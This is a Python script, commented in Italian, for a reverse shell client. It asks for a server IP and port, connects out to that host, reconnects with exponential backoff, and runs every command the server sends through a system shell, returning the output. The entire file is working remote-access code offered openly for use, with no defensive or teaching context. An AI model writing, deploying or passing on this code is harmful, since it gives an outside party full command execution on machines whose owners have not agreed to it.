#!/usr/bin/env python3
"""
Reverse Shell Client - Versione con IP configurabile
"""
import os
import sys
import time
import random
import socket
import struct
import subprocess

def get_valid_ip():
    """Richiede all'utente l'IP del server con validazione"""
    while True:
        ip = input("Inserisci l'IP del server: ").strip()
        try:
            socket.inet_aton(ip)  # Verifica che l'IP sia valido
            return ip
        except socket.error:
            print(f"Errore: {ip} non è un indirizzo IP valido. Riprova.")

def get_valid_port():
    """Richiede all'utente la porta con validazione"""
    while True:
        port = input("Inserisci la porta del server (default 8000): ").strip()
        if not port:
            return 8000
        try:
            port = int(port)
            if 1 <= port <= 65535:
                return port
            print("La porta deve essere tra 1 e 65535")
        except ValueError:
            print("Inserisci un numero valido per la porta")

def reliable_send(sock, data):
    """Invia dati con prefisso di lunghezza"""
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(struct.pack('>I', len(data)))
    sock.sendall(data)

def reliable_recv(sock):
    """Riceve dati con prefisso di lunghezza"""
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    data_len = struct.unpack('>I', raw_len)[0]
    return sock.recv(data_len)

def execute_command(command):
    """Esegue un comando locale e restituisce l'output"""
    try:
        if command.startswith('cd '):
            os.chdir(command[3:])
            return b""
        proc = subprocess.run(command, shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
        return proc.stdout + proc.stderr
    except Exception as e:
        return str(e).encode()

def connect_to_server(server_ip, server_port):
    """Tenta di connettersi al server con riconnessione automatica"""
    reconnect_delay = 5  # Delay iniziale tra tentativi (in secondi)
    max_delay = 60      # Delay massimo tra tentativi
    
    while True:
        try:
            print(f"\n[*] Tentativo di connessione a {server_ip}:{server_port}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_ip, server_port))
            print("[+] Connessione riuscita! In attesa di comandi...")
            return sock
        except (socket.error, ConnectionRefusedError) as e:
            print(f"[!] Connessione fallita: {str(e)}")
            print(f"[*] Nuovo tentativo tra {reconnect_delay} secondi...")
            time.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 2, max_delay)  # Backoff esponenziale
        except KeyboardInterrupt:
            print("\n[!] Interruzione da tastiera. Uscita.")
            sys.exit(0)

def main():
    """Funzione principale"""
    print("\n=== Reverse Shell Client ===")
    server_ip = get_valid_ip()
    server_port = get_valid_port()
    
    while True:
        try:
            sock = connect_to_server(server_ip, server_port)
            
            # Loop principale per l'esecuzione dei comandi
            while True:
                command = reliable_recv(sock)
                if not command or command.decode().lower() == 'exit':
                    break
                
                output = execute_command(command.decode())
                reliable_send(sock, output)
            
            sock.close()
            print("[!] Connessione chiusa dal server. Riconnessione...")
            
        except Exception as e:
            print(f"[!] Errore critico: {str(e)}")
            time.sleep(5)

if __name__ == "__main__":
    main()